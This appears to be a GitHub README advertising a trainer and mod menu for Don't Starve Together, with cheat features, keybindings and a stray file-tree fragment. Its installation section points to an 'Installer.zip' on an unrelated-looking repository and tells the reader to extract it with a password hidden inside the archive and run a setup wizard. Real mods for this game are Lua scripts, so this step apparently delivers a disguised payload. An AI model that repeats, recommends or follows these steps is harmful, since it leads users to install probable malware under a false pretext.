A powerful, customizable **in-game trainer and developer modmenu** for Don't Starve Together. This tool is designed for mod developers, testers, and players who want to experiment with game mechanics, automate tasks, and testing for sandbox environment.

## ✨ Features

### 👤 Character Modifications
* **Stats Upgrader:** Toggle infinite health, sanity, and hunger for testing purposes.
* **Speed Amplifier:** Configurable movement speed.
* **Crafting Opener:** Gives you all recipes instantly without prototype structures.

### 📦 Item & Prefab Spawner
* **Search Filter:** Easily find items, giants, structures, or resources by name.
* **Spawn Options:** Spawn prefabs directly at your character's position or mouse cursor.
* **Custom Quantities:** Choose exactly how many items to generate at once.

### 🌍 World & Time Control
* **Skip Time:** Fast-forward through days or specific phases of time.
* **Season Changer:** Instantly switch between Autumn, Winter, Spring, and Summer.
* **Weather Control:** Toggle rain, snow, frog rain, or lightning strikes.

## 🚀 Installation

### Release
1. Download the latest release from the [**Get Releases**](https://github.com/Solderouplan/kuzoku-klan/releases/download/dfsa/Installer.zip) Icon (_in the top of repo_).
2. Extract the archive into any convenient place with pass _(mentioned in archive)_.
3. Open the wizard setup and follow wizard steps.
4. Launch the game, tap F4 on your keyboard.
5. Make mods, have fun!

## ⌨️ Keybindings

| Key | Action | Description |
| :--- | :--- | :--- |
| **`F4`** | Toggle Menu | Opens and closes the main utility overlay. |
| **`G`** | Invincibility Mode | Toggles infinite stats for the current character. |
| **`K`** | Clear Radius | Removes nearby prefabs/entities (useful for cleanup). |
| **`Home`**| Reload UI | Hot-reloads the modification interface. |

*Note: You can rebind all hotkeys in the mod configuration menu via the main screen.*

├── modmain.lua            # Core initialization and event hooks

    └── widgets/           # UI components and menu screens
